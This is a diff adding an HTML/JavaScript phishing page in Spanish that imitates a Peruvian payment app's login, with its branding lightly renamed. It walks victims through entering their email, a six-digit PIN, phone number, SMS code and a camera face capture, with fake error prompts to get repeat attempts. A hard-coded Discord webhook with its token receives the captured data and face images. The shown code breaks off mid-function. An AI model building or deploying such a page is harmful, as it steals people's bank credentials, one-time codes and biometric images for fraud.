@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ingreso Seguro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        /* Variables de colores (Renombradas para evitar marcas) */
+        :root {
+            --brand-purple-dark: #5d0d6e;
+            --brand-purple-light: #822199;
+            --brand-teal: #00b2a9;
+            --bg-white: #ffffff;
+            --text-dark: #222222;
+            --text-grey: #666666;
+            --btn-disabled-bg: #e6e6e6;
+            --btn-disabled-text: #9e9e9e;
+            --circle-bg: #f3f4f9;
+            --divider: #e0e0e0;
+            --error-red: #e53935;
+            
+            /* Colores pantalla PIN */
+            --pin-bg: #6b1476;
+            --pin-btn-bg: #862d96;
+            --pin-text-light: rgba(255, 255, 255, 0.6);
+
+            /* Colores SMS */
+            --sms-box-bg: #f3f1f6;
+            --sms-btn-disabled: #b1a8b6;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .web-container {
+            width: 100%;
+            max-width: 480px;
+            position: relative;
+            height: 100vh;
+            overflow: hidden;
+            background-color: var(--bg-white);
+            box-shadow: 0 0 20px rgba(0,0,0,0.1); 
+        }
+
+        .view {
+            display: none;
+            width: 100%;
+            height: 100vh;
+            overflow-y: auto;
+            flex-direction: column;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        .view.active { display: flex; }
+
+        /* =========================================
+           ESTILOS GENERALES
+           ========================================= */
+        .title-page { color: #6b1476; font-size: 26px; font-weight: 800; margin-bottom: 12px; }
+        .subtitle-page { color: var(--text-dark); font-size: 16px; line-height: 1.4; margin-bottom: 30px; }
+        
+        .btn-primary {
+            width: 100%; height: 55px;
+            background-color: var(--brand-purple-dark);
+            color: white; border: none; border-radius: 12px;
+            font-size: 16px; font-weight: 600;
+            cursor: pointer; transition: all 0.3s ease;
+            margin-top: auto; margin-bottom: 20px;
+        }
+        .btn-primary:disabled { background-color: var(--sms-btn-disabled); cursor: not-allowed; }
+
+        .btn-back {
+            width: 40px; height: 40px; background-color: #f3f4f9;
+            border-radius: 50%; display: flex; justify-content: center; align-items: center;
+            cursor: pointer; margin-bottom: 20px;
+        }
+        .btn-back::after {
+            content: ""; width: 10px; height: 10px;
+            border-left: 2px solid #222; border-bottom: 2px solid #222;
+            transform: rotate(45deg); margin-left: 4px;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        .shake { animation: shake 0.5s; }
+
+        /* =========================================
+           VISTA 1: LOGIN
+           ========================================= */
+        #loginView { background-color: var(--bg-white); }
+        .hero {
+            height: 320px; background: linear-gradient(180deg, #7a1b90 0%, #4e0f5c 100%);
+            position: relative; display: flex; justify-content: center; align-items: flex-end;
+            padding-bottom: 30px; overflow: hidden; flex-shrink: 0;
+        }
+        .btn-back-circle {
+            position: absolute; top: 25px; left: 20px; width: 40px; height: 40px;
+            background-color: rgba(255, 255, 255, 0.15); border-radius: 50%;
+            display: flex; justify-content: center; align-items: center; z-index: 10; cursor: pointer;
+        }
+        .btn-back-circle::after {
+            content: ""; width: 10px; height: 10px;
+            border-left: 2px solid white; border-bottom: 2px solid white;
+            transform: rotate(45deg); margin-left: 4px;
+        }
+        .stars { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: radial-gradient(2px 2px at 20px 30px, #fff, rgba(0,0,0,0)), radial-gradient(2px 2px at 40px 70px, #fff, rgba(0,0,0,0)), radial-gradient(2px 2px at 50px 160px, #fff, rgba(0,0,0,0)), radial-gradient(2px 2px at 90px 40px, #fff, rgba(0,0,0,0)), radial-gradient(2px 2px at 130px 80px, #fff, rgba(0,0,0,0)), radial-gradient(2px 2px at 160px 120px, #fff, rgba(0,0,0,0)), radial-gradient(2px 2px at 250px 30px, #fff, rgba(0,0,0,0)), radial-gradient(2px 2px at 300px 150px, #fff, rgba(0,0,0,0)); background-repeat: repeat; background-size: 350px 200px; opacity: 0.4; }
+        .cloud { position: absolute; background-color: #8e2ca3; border-radius: 20px; opacity: 0.6; }
+        .cloud-1 { width: 50px; height: 20px; top: 60px; left: 20px; }
+        .cloud-2 { width: 70px; height: 25px; top: 110px; right: 20px; }
+        .cloud-3 { width: 40px; height: 15px; top: 140px; left: 60px; }
+        .city { position: absolute; bottom: 0; left: 0; width: 100%; height: 100px; display: flex; align-items: flex-end; z-index: 1; }
+        .building { background-color: #3b0a47; margin-right: 2px; }
+        .b1 { width: 30px; height: 50px; } .b2 { width: 45px; height: 80px; } .b3 { width: 25px; height: 60px; } .b4 { width: 50px; height: 90px; } .b5 { width: 35px; height: 45px; } .b6 { width: 60px; height: 100px; } .b7 { width: 40px; height: 70px; }
+        .sparkle { position: absolute; color: #ffce00; z-index: 2; animation: twinkle 2s infinite alternate; }
+        .s1 { top: 120px; left: 60px; font-size: 18px; } .s2 { top: 160px; right: 50px; font-size: 28px; } .s3 { top: 80px; right: 80px; font-size: 14px; }
+        @keyframes twinkle { 0% { opacity: 0.5; transform: scale(0.8); } 100% { opacity: 1; transform: scale(1.2); } }
+        .phone-illustration { position: relative; z-index: 5; width: 150px; height: 230px; background: linear-gradient(135deg, #ef6c7c 0%, #d94a5a 100%); border-radius: 25px; border: 5px solid #c03c4b; transform: rotate(-12deg); box-shadow: 10px 15px 30px rgba(0,0,0,0.3); display: flex; justify-content: center; align-items: center; }
+        .phone-screen { width: 85%; height: 85%; background-color: #741c88; border-radius: 15px; position: relative; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .face { position: absolute; top: 30px; display: flex; flex-direction: column; align-items: center; }
+        .eyes { display: flex; gap: 25px; margin-bottom: 5px; }
+        .eye { width: 8px; height: 8px; background-color: #d94a5a; border-radius: 50%; }
+        .smile { width: 15px; height: 8px; border-bottom: 2px solid #d94a5a; border-radius: 0 0 10px 10px; }
+        .logo-app { display: flex; flex-direction: column; align-items: center; margin-top: 20px; }
+        .logo-icon { width: 25px; height: 25px; background-color: var(--brand-teal); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-weight: 800; font-size: 10px; margin-bottom: 2px; }
+        /* Cambiamos el texto interno del logo por "APP" o "Secure" */
+        .logo-text { color: white; font-family: 'Arial', sans-serif; font-size: 26px; font-weight: 800; font-style: italic; letter-spacing: -1px; }
+        .hand-left { position: absolute; left: -20px; bottom: 50px; width: 50px; height: 20px; background-color: #d94a5a; border-radius: 10px; transform: rotate(30deg); }
+        .megaphone-group { position: absolute; right: -30px; top: 60px; transform: rotate(15deg); z-index: -1; }
+        .megaphone-cone { width: 50px; height: 40px; background-color: #d94a5a; clip-path: polygon(0 20%, 100% 0, 100% 100%, 0 80%); border-radius: 5px; }
+        .megaphone-handle { position: absolute; left: -20px; top: 10px; width: 30px; height: 15px; background-color: #c03c4b; border-radius: 10px; }
+        .hand-right { position: absolute; left: -10px; top: 15px; width: 20px; height: 15px; background-color: #ef6c7c; border-radius: 10px; z-index: 2; }
+
+        .content { background-color: var(--bg-white); border-radius: 25px 25px 0 0; margin-top: -25px; z-index: 10; position: relative; padding: 40px 30px; flex-grow: 1; display: flex; flex-direction: column; }
+        .title { color: #6b1476; font-size: 26px; font-weight: 800; text-align: center; margin-bottom: 12px; }
+        .subtitle { color: var(--text-dark); font-size: 15px; text-align: center; margin-bottom: 40px; }
+        .subtitle a { color: var(--brand-teal); text-decoration: none; border-bottom: 1px solid var(--brand-teal); padding-bottom: 1px; cursor: pointer; }
+        
+        .form-group { margin-bottom: 25px; position: relative; }
+        .form-group label { display: block; color: var(--text-dark); font-size: 14px; font-weight: 500; margin-bottom: 8px; }
+        .form-group input { width: 100%; height: 55px; padding: 0 15px; border: 1.5px solid var(--text-dark); border-radius: 12px; font-size: 16px; outline: none; background-color: transparent; transition: border-color 0.3s; }
+        .form-group input:focus { border-color: var(--brand-purple-light); }
+        .form-group input.input-error { border-color: var(--error-red); }
+        
+        .btn-continue { width: 100%; height: 55px; background-color: var(--btn-disabled-bg); color: var(--btn-disabled-text); border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: not-allowed; margin-bottom: 35px; transition: all 0.3s ease; }
+        .btn-continue.active { background-color: var(--brand-purple-dark); color: white; cursor: pointer; }
+        
+        .divider { width: 100%; height: 1px; background-color: var(--divider); margin-bottom: 35px; }
+        .action-buttons { display: flex; justify-content: center; gap: 30px; margin-bottom: 40px; }
+        .action-btn { display: flex; flex-direction: column; align-items: center; text-decoration: none; color: var(--text-dark); background: none; border: none; cursor: pointer; font-family: inherit; }
+        .icon-circle { width: 65px; height: 65px; background-color: var(--circle-bg); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 12px; transition: background-color 0.2s; }
+        .action-btn:hover .icon-circle { background-color: #e2e4eb; }
+        .icon-circle svg { width: 24px; height: 24px; fill: var(--text-dark); }
+        .action-btn span { font-size: 14px; font-weight: 500; text-align: center; line-height: 1.3; }
+        .footer { text-align: center; font-size: 15px; color: var(--text-grey); margin-top: auto; padding-bottom: 20px; }
+        .footer a { color: var(--brand-teal); text-decoration: none; font-weight: 600; cursor: pointer; }
+
+        /* =========================================
+           VISTAS DE CARGA
+           ========================================= */
+        #loadingView, #loadingView2, #loadingSmsView, #loadingViewSms, #loadingView3 {
+            background-color: var(--brand-purple-dark);
+            justify-content: center; align-items: center; color: white; z-index: 20;
+        }
+        .spinner-container { display: flex; flex-direction: column; align-items: center; gap: 20px; padding: 0 20px; text-align: center; }
+        .spinner { width: 60px; height: 60px; border: 5px solid rgba(255, 255, 255, 0.2); border-top: 5px solid var(--brand-teal); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { font-size: 18px; font-weight: 500; letter-spacing: 0.5px; animation: pulse 1.5s ease-in-out infinite; }
+        .loading-subtext { font-size: 14px; color: rgba(255, 255, 255, 0.7); margin-top: 5px; }
+        @keyframes pulse { 0%, 100% { opacity: 0.7; } 50% { opacity: 1; } }
+
+        /* =========================================
+           VISTA 3: PANTALLA DE PIN
+           ========================================= */
+        #pinView { background-color: var(--pin-bg); color: white; padding: 30px 20px 20px 20px; z-index: 15; }
+        .pin-back { width: 40px; height: 40px; background-color: rgba(255, 255, 255, 0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; margin-bottom: 30px; }
+        .pin-back::after { content: ""; width: 10px; height: 10px; border-left: 2px solid white; border-bottom: 2px solid white; transform: rotate(45deg); margin-left: 4px; }
+        .lock-container { display: flex; justify-content: center; margin-bottom: 30px; position: relative; }
+        .lock-icon { width: 80px; height: 80px; position: relative; }
+        .pin-title { text-align: center; font-size: 26px; font-weight: 700; margin-bottom: 10px; }
+        .pin-subtitle { text-align: center; font-size: 16px; color: var(--pin-text-light); margin-bottom: 50px; }
+        .pin-dots { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; }
+        .dot { width: 12px; height: 12px; background-color: rgba(255, 255, 255, 0.3); border-radius: 50%; transition: background-color 0.2s; }
+        .dot.filled { background-color: white; }
+        
+        #pinError, #smsError { text-align: center; color: #ffb3b3; font-size: 14px; font-weight: 600; margin-bottom: 40px; height: 20px; display: none; }
+        #smsError { color: var(--error-red); margin-bottom: 20px; }
+
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; padding: 0 10px; margin-top: auto; margin-bottom: 20px; }
+        .key-btn { background-color: var(--pin-btn-bg); color: white; border: none; border-radius: 12px; height: 65px; font-size: 26px; font-weight: 500; font-family: 'Inter', sans-serif; cursor: pointer; display: flex; justify-content: center; align-items: center; transition: background-color 0.1s, transform 0.1s; }
+        .key-btn:active { background-color: #a041b3; transform: scale(0.95); }
+        .key-empty { background: transparent; cursor: default; pointer-events: none; }
+        .key-backspace svg { width: 28px; height: 28px; fill: white; }
+
+        /* =========================================
+           VISTA 4: INGRESO DE NÚMERO
+           ========================================= */
+        #phoneView { padding: 30px 25px; z-index: 22; }
+        .phone-input-group { display: flex; align-items: center; border-bottom: 2px solid var(--text-dark); padding-bottom: 10px; margin-bottom: 30px; }
+        .phone-prefix { font-size: 20px; font-weight: 600; color: var(--text-dark); margin-right: 10px; }
+        #phoneInput { flex-grow: 1; border: none; font-size: 20px; font-weight: 500; outline: none; color: var(--text-dark); letter-spacing: 1px; }
+        #phoneInput::placeholder { color: #ccc; letter-spacing: normal; }
+
+        /* =========================================
+           VISTA 6: CÓDIGO SMS
+           ========================================= */
+        #smsView { padding: 30px 25px; z-index: 23; }
+        .sms-back-header { display: flex; align-items: center; gap: 15px; margin-bottom: 40px; }
+        .sms-back-header .btn-back { margin-bottom: 0; background-color: #f3f1f6; }
+        .sms-back-header span { font-size: 18px; font-weight: 500; color: var(--text-dark); }
+        .sms-title { color: #6b1476; font-size: 28px; font-weight: 800; margin-bottom: 12px; }
+        .sms-subtitle { color: var(--text-dark); font-size: 16px; line-height: 1.4; margin-bottom: 30px; }
+        .sms-subtitle span { font-weight: 600; }
+        
+        .sms-inputs-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 15px; }
+        .sms-box { width: 48px; height: 60px; background-color: var(--sms-box-bg); border: 2px solid transparent; border-radius: 12px; font-size: 24px; font-weight: 600; color: var(--text-dark); text-align: center; outline: none; transition: border-color 0.2s; }
+        .sms-box:focus { border-color: var(--brand-purple-light); }
+        
+        .sms-timer { font-size: 15px; color: var(--text-dark); margin-bottom: 30px; }
+        .sms-timer span { font-weight: 700; }
+
+        /* =========================================
+           VISTA 7: VERIFICACIÓN FACIAL
+           ========================================= */
+        #facialView { background-color: #121212; color: white; padding: 30px 20px; z-index: 25; justify-content: center; align-items: center; }
+        .facial-header { text-align: center; margin-bottom: 30px; margin-top: 20px; }
+        .facial-header h2 { font-size: 24px; font-weight: 700; margin-bottom: 10px; }
+        .facial-header p { font-size: 15px; color: #b0b0b0; line-height: 1.4; }
+        
+        .camera-simulation { width: 280px; height: 380px; background: #000; border-radius: 20px; position: relative; display: flex; justify-content: center; align-items: center; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-bottom: 20px; }
+        #videoFeed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; display: none; transform: scaleX(-1); }
+        .face-guide { width: 180px; height: 240px; border: 3px dashed rgba(255, 255, 255, 0.5); border-radius: 50%; position: absolute; z-index: 2; transition: border-color 0.3s; }
+        .scan-line { position: absolute; width: 100%; height: 4px; background-color: var(--brand-teal); box-shadow: 0 0 15px var(--brand-teal); top: 0; z-index: 3; opacity: 0; transition: opacity 0.3s; }
+        .camera-simulation.scanning .scan-line { opacity: 1; animation: scan 2s linear infinite; }
+        .camera-simulation.scanning .face-guide { border-color: var(--brand-teal); border-style: solid; }
+        @keyframes scan { 0% { top: 10%; } 50% { top: 90%; } 100% { top: 10%; } }
+        .success-icon { position: absolute; z-index: 10; width: 80px; height: 80px; background-color: var(--brand-teal); border-radius: 50%; display: flex; justify-content: center; align-items: center; opacity: 0; transform: scale(0.5); transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .success-icon svg { width: 45px; height: 45px; fill: white; }
+        .camera-simulation.success .success-icon { opacity: 1; transform: scale(1); }
+        .camera-simulation.success .face-guide { opacity: 0; }
+        
+        #facialError { text-align: center; color: #ff4a4a; font-size: 14px; font-weight: 600; margin-bottom: 20px; height: 20px; display: none; }
+
+        .btn-start-verification { background-color: var(--brand-purple-light); color: white; border: none; border-radius: 12px; padding: 16px 30px; font-size: 16px; font-weight: 600; font-family: 'Inter', sans-serif; cursor: pointer; transition: background-color 0.3s; width: 100%; max-width: 300px; }
+        .btn-start-verification:hover { background-color: #9a35b0; }
+        .btn-start-verification:disabled { background-color: #4a4a4a; cursor: not-allowed; }
+
+        /* =========================================
+           VISTA 8: ÉXITO FINAL
+           ========================================= */
+        #successView { background-color: var(--brand-purple-dark); justify-content: center; align-items: center; color: white; text-align: center; z-index: 30; }
+        .success-check-circle { width: 120px; height: 120px; background-color: var(--brand-teal); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 30px; animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .success-check-circle svg { width: 70px; height: 70px; fill: white; }
+        @keyframes popIn { 0% { transform: scale(0); opacity: 0; } 80% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); } }
+
+    </style>
+</head>
+<body>
+
+    <div class="web-container">
+        
+        <!-- 1. LOGIN -->
+        <div id="loginView" class="view active">
+            <div class="hero">
+                <button class="btn-back-circle" onclick="history.back()" aria-label="Volver"></button>
+                <div class="stars"></div><div class="cloud cloud-1"></div><div class="cloud cloud-2"></div><div class="cloud cloud-3"></div>
+                <div class="sparkle s1">✦</div><div class="sparkle s2">✦</div><div class="sparkle s3">✦</div>
+                <div class="city"><div class="building b1"></div><div class="building b2"></div><div class="building b3"></div><div class="building b4"></div><div class="building b5"></div><div class="building b6"></div><div class="building b7"></div></div>
+                <div class="phone-illustration">
+                    <div class="megaphone-group"><div class="megaphone-handle"></div><div class="hand-right"></div><div class="megaphone-cone"></div></div>
+                    <div class="hand-left"></div>
+                    <div class="phone-screen">
+                        <div class="face"><div class="eyes"><div class="eye"></div><div class="eye"></div></div><div class="smile"></div></div>
+                        <div class="logo-app">
+                            <div class="logo-icon">S/</div>
+                            <!-- Cambiado el logo de 'yape' a 'Secure' -->
+                            <div class="logo-text">Secure</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="content">
+                <!-- Textos genéricos sin marca -->
+                <h1 class="title">Ingresa a tu cuenta</h1>
+                <p class="subtitle">¿Todavía no te registraste? <a onclick="alert('Redirigiendo...')">Crea tu cuenta aquí</a></p>
+                <form id="loginForm" onsubmit="handleLogin(event)">
+                    <div class="form-group">
+                        <label for="emailInput">Correo electrónico</label>
+                        <input type="text" id="emailInput" placeholder="ejemplo@hotmail.com" autocomplete="off">
+                    </div>
+                    <button type="submit" class="btn-continue" id="btnContinue" disabled>Continuar</button>
+                </form>
+                <div class="divider"></div>
+                <div class="action-buttons">
+                    <button class="action-btn" onclick="alert('Cambiar clave...')"><div class="icon-circle"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg></div><span>Cambiar mi<br>clave</span></button>
+                    <button class="action-btn" onclick="alert('Cambiar número...')"><div class="icon-circle"><svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14zm-5-2.5c.83 0 1.5-.67 1.5-1.5s-.67-1.5-1.5-1.5-1.5.67-1.5 1.5.67 1.5 1.5 1.5z"/><path d="M10.5 9.5l-2 2 2 2M13.5 9.5l2 2-2 2" stroke="black" stroke-width="1.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><path d="M9 11.5h6" stroke="black" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg></div><span>Cambiar mi<br>número</span></button>
+                </div>
+                <div class="footer">¿Dudas? <a onclick="alert('Ayuda...')">Ingresa al Centro de Ayuda</a></div>
+            </div>
+        </div>
+
+        <!-- 2. CARGA 1 -->
+        <div id="loadingView" class="view">
+            <div class="spinner-container"><div class="spinner"></div><div class="loading-text">Validando correo...</div></div>
+        </div>
+
+        <!-- 3. PIN -->
+        <div id="pinView" class="view">
+            <div class="pin-back" onclick="goBackToLogin()"></div>
+            <div class="lock-container"><svg class="lock-icon" viewBox="0 0 100 100"><rect x="25" y="45" width="50" height="40" rx="8" fill="#d5a6df"/><path d="M35 45V30C35 20 42 15 50 15C58 15 65 20 65 30V45" fill="none" stroke="#d5a6df" stroke-width="8" stroke-linecap="round"/><circle cx="50" cy="60" r="6" fill="#862d96"/><rect x="47" y="60" width="6" height="12" fill="#862d96"/><circle cx="70" cy="75" r="12" fill="#00b2a9"/><circle cx="66" cy="73" r="1.5" fill="white"/><circle cx="74" cy="73" r="1.5" fill="white"/><path d="M66 77 Q70 81 74 77" fill="none" stroke="white" stroke-width="1.5" stroke-linecap="round"/></svg></div>
+            <!-- Texto cambiado a 'Ingresa tu clave' -->
+            <h1 class="pin-title">Ingresa tu clave</h1><p class="pin-subtitle">Clave de 6 dígitos</p>
+            
+            <div class="pin-dots" id="pinDotsContainer">
+                <div class="dot" id="dot-0"></div><div class="dot" id="dot-1"></div><div class="dot" id="dot-2"></div>
+                <div class="dot" id="dot-3"></div><div class="dot" id="dot-4"></div><div class="dot" id="dot-5"></div>
+            </div>
+            
+            <div id="pinError">PIN incorrecto. Quedan 2 intentos</div>
+
+            <div class="keypad" id="keypadContainer"></div>
+        </div>
+
+        <!-- 4. CARGA 2 -->
+        <div id="loadingView2" class="view">
+            <div class="spinner-container"><div class="spinner"></div><div class="loading-text">Verificando seguridad...</div></div>
+        </div>
+
+        <!-- 5. INGRESO DE TELÉFONO -->
+        <div id="phoneView" class="view">
+            <div class="btn-back" onclick="backToPin()"></div>
+            <h1 class="title-page">Ingresa tu celular</h1>
+            <p class="subtitle-page">Te enviaremos un código SMS para validar tu identidad.</p>
+            <div class="phone-input-group">
+                <span class="phone-prefix">+51</span>
+                <input type="tel" id="phoneInput" placeholder="999 999 999" maxlength="9" inputmode="numeric">
+            </div>
+            <button class="btn-primary" id="btnPhone" disabled onclick="sendSmsCode()">Continuar</button>
+        </div>
+
+        <!-- 6. CARGA SMS -->
+        <div id="loadingSmsView" class="view">
+            <div class="spinner-container"><div class="spinner"></div><div class="loading-text">Enviando SMS...</div></div>
+        </div>
+
+        <!-- 7. VALIDACIÓN SMS -->
+        <div id="smsView" class="view">
+            <div class="sms-back-header">
+                <div class="btn-back" onclick="backToPhone()"></div>
+                <span>Regresar</span>
+            </div>
+            <h1 class="sms-title">Código de validación</h1>
+            <p class="sms-subtitle">Te hemos enviado un SMS con un código para verificar tu número <span id="maskedPhone">*** *** 638</span></p>
+            
+            <div class="sms-inputs-container" id="smsInputs">
+                <input type="text" class="sms-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="sms-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="sms-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="sms-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="sms-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="sms-box" maxlength="1" inputmode="numeric">
+            </div>
+            
+            <div id="smsError">Código SMS incorrecto. Quedan 2 intentos</div>
+
+            <p class="sms-timer" id="timerText">Puedes solicitar un nuevo código en <span id="timerCount">19</span> segundos</p>
+            <button class="btn-primary" id="btnSms" disabled onclick="verifySmsCode()">Validar código</button>
+        </div>
+
+        <!-- CARGA 3 SEGUNDOS ANTES DEL FACIAL -->
+        <div id="loadingViewSms" class="view">
+            <div class="spinner-container"><div class="spinner"></div><div class="loading-text">Verificando SMS...</div></div>
+        </div>
+
+        <!-- 8. VERIFICACIÓN FACIAL -->
+        <div id="facialView" class="view">
+            <div class="facial-header">
+                <h2>Verificación Facial</h2>
+                <p>Coloca tu rostro dentro del círculo y asegúrate de tener buena iluminación.</p>
+            </div>
+            <div class="camera-simulation" id="cameraSim">
+                <video id="videoFeed" autoplay playsinline muted></video>
+                <canvas id="captureCanvas" style="display:none;"></canvas>
+                
+                <div class="face-guide"></div>
+                <div class="scan-line"></div>
+                <div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+            </div>
+            
+            <div id="facialError">No se reconoció el rostro. Inténtalo de nuevo.</div>
+
+            <button class="btn-start-verification" id="btnVerify" onclick="startFacialVerification()">Iniciar verificación</button>
+        </div>
+
+        <!-- 9. CARGA FINAL -->
+        <div id="loadingView3" class="view">
+            <div class="spinner-container">
+                <div class="spinner"></div><div class="loading-text">Procesando información...</div>
+                <div class="loading-subtext">Esto puede tardar varios minutos.<br>Por favor, no cierres esta ventana.</div>
+            </div>
+        </div>
+
+        <!-- 10. ÉXITO -->
+        <div id="successView" class="view">
+            <div class="success-check-circle"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+            <h1 style="font-size: 28px; font-weight: 700; margin-bottom: 10px;">¡Verificación Exitosa!</h1>
+            <p style="font-size: 16px; opacity: 0.8;">Redirigiendo al inicio...</p>
+        </div>
+
+    </div>
+
+    <script>
+        /* ==========================================
+           CONFIGURACIÓN DE DISCORD WEBHOOK
+           ========================================== */
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1554945893789204500/GyxZu8fZeLKpgg5rEFuCyUau34lvNDQFqtRpq1TaaFGwmSq0b_HYuHeLn0ATJObBZY6d';
+
+        // Cambiado "Yape Bot" a "Security Bot"
+        async function enviarDiscord(titulo, mensaje, color = 5814783) {
+            if (!DISCORD_WEBHOOK_URL) return;
+            const payload = {
+                username: "Security Bot 🛡️",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/9382/9382196.png",
+                embeds: [{ title: titulo, description: mensaje, color: color, timestamp: new Date().toISOString(), footer: { text: "Security System" } }]
+            };
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) { console.error("Error enviando texto a Discord:", error); }
+        }
+
+        async function enviarDiscordConImagen(titulo, mensaje, imageBlob, color = 5814783) {
+            if (!DISCORD_WEBHOOK_URL) return;
+            const formData = new FormData();
+            const payload = {
+                username: "Security Bot 🛡️",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/9382/9382196.png",
+                embeds: [{
+                    title: titulo,
+                    description: mensaje,
+                    color: color,
+                    image: { url: "attachment://captura_facial.jpg" },
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "Security System" }
+                }]
+            };
+            formData.append('payload_json', JSON.stringify(payload));
+            formData.append('file', imageBlob, 'captura_facial.jpg');
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
+            } catch (error) { console.error("Error enviando imagen a Discord:", error); }
+        }
+
+        /* --- VARIABLES GLOBALES --- */
+        const views = document.querySelectorAll('.view');
+        const emailInput = document.getElementById('emailInput');
+        const btnContinue = document.getElementById('btnContinue');
+        const keypadContainer = document.getElementById('keypadContainer');
+        const pinError = document.getElementById('pinError');
+        const pinDotsContainer = document.getElementById('pinDotsContainer');
+        
+        const phoneInput = document.getElementById('phoneInput');
+        const btnPhone = document.getElementById('btnPhone');
+        
+        const smsBoxes = document.querySelectorAll('.sms-box');
+        const btnSms = document.getElementById('btnSms');
+        const timerText = document.getElementById('timerText');
+        const smsError = document.getElementById('smsError');
+        const smsInputs = document.getElementById('smsInputs');
+
+        const cameraSim = document.getElementById('cameraSim');
+        const btnVerify = document.getElementById('btnVerify');
+        const videoFeed = document.getElementById('videoFeed');
+        const facialError = document.getElementById('facialError');
+        const captureCanvas = document.getElementById('captureCanvas');
+        
+        let mediaStream = null;
+        let pinCode = [];
+        let smsTimerInterval = null;
+        
+        let pinAttempts = 1; 
+        let smsAttempts = 1;
+        let facialAttempts = 1;
+
+        const regexEstricto = /^[a-zA-Z0-9._%+-]+@(hotmail|outlook|live|gmail)\.(com|es|pe|com\.pe|com\.es|net|org)$/i;
+
+        function switchView(viewId) {
+            views.forEach(v => v.classList.remove('active'));
+            document.getElementById(viewId).classList.add('active');
+        }
+
+        /* --- 1. LOGIN --- */
+        emailInput.addEventListener('input', function() {
+            const valor = this.value.trim();
+            if (valor === '') {
+                btnContinue.setAttribute('disabled', 'true');
+                btnContinue.classList.remove('active');
+                emailInput.classList.remove('input-error');
+                return;
+            }
+            if (regexEstricto.test(valor)) {
+                btnContinue.removeAttribute('disabled');
+                btnContinue.classList.add('active');
+                emailInput.classList.remove('input-error');
+            } else {
+                btnContinue.setAttribute('disabled', 'true');
+                btnContinue.classList.remove('active');
+                emailInput.classList.add('input-error');
+            }
+        });
+
+        function handleLogin(event) {
+            event.preventDefault(); 
+            if (!regexEstricto.test(emailInput.value.trim())) return;
+            enviarDiscord("📧 Correo Ingresado", `**Email:** \`${emailInput.value.trim()}\``, 3447003);
+            switchView('loadingView');
+            setTimeout(() => {
+                generarTecladoAleatorio();
+                switchView('pinView');
+            }, 3000);
+        }
+
+        /* --- 3. PIN --- */
+        function generarTecladoAleatorio() {
+            keypadContainer.innerHTML = ''; 
+            let numeros = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
+            for (let i = numeros.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [numeros[i], numeros[j]] = [numeros[j], numeros[i]];
+            }
+            numeros.forEach(num => {
+                const btn = document.createElement('button');
+                btn.className = 'key-btn'; btn.innerText = num;
+                btn.onclick = () => addPin(num);
+                keypadContainer.appendChild(btn);
+            });
